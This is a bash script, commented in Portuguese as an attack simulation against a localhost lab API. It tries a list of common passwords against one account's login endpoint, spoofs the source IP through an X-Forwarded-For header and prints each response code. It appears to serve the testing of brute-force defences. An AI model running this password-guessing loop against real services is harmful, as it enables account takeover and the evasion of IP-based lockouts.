#!/usr/bin/env bash
# SIMULAÇÃO DE ATAQUE — só contra a API local do laboratório (localhost).
# Testa uma lista de senhas comuns contra uma conta, a partir de um "IP de atacante" (cabeçalho X-Forwarded-For).
API=${API:-http://localhost:3000}; IP=${IP:-203.0.113.66}; CONTA=${CONTA:-carla@cliente.com}
for senha in 123456 senha qwerty admin 12345678 loja2026 carla123 abc123 111111 iloveyou \
             senha123 password 654321 brasil 000000 letmein dragon monkey 1q2w3e senhaforte \
             Senha#Forte2026; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: $IP" -H "User-Agent: hydra-sim/1.0" \
         -H "Content-Type: application/json" -d "{\"email\":\"$CONTA\",\"senha\":\"$senha\"}" $API/api/login)
  echo "$senha -> $code"
done
